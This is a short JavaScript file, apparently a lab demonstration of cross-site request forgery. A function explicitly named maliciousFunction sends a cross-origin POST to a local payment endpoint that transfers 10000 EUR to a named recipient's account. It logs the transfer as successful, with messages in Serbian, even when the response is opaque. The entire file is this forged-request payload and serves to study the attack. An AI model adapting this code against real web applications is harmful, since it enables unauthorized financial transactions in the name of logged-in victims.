
function JSONNewPayment(recipient, account, amount, currency, managerId) {
	return JSON.stringify({
		"recipient" : recipient,
		"account" : account,
		"amount" : amount,
		"currency" : currency,
		"managerId" : managerId
	});
}

function maliciousFunction() {
	recipient = "Mina Medić";
	account = 123;
	amount = 10000;
	currency = "EUR";
	managerId = 1;
	
	$.ajax({
		type : "POST",
		contentType : "application/json",
		crossDomain: true,
		headers: {
            'Access-Control-Allow-Origin': '*'
        },
		url : "http://localhost:8080/payments",
		data : JSONNewPayment(recipient, account, amount, currency, managerId),
		success : function() {
			console.log("Uplata je uspešno izvršena. Uplaćeno je " + amount + currency +  " na račun broj " +  account);
		},
		error : function(data) {
			if(data.status == 0)
				console.log("Uplata je uspešno izvršena. Uplaćeno je " + amount + currency +  " na račun broj " +  account);
			else
				console.log("Dogodila se greška!");
		}
	});
}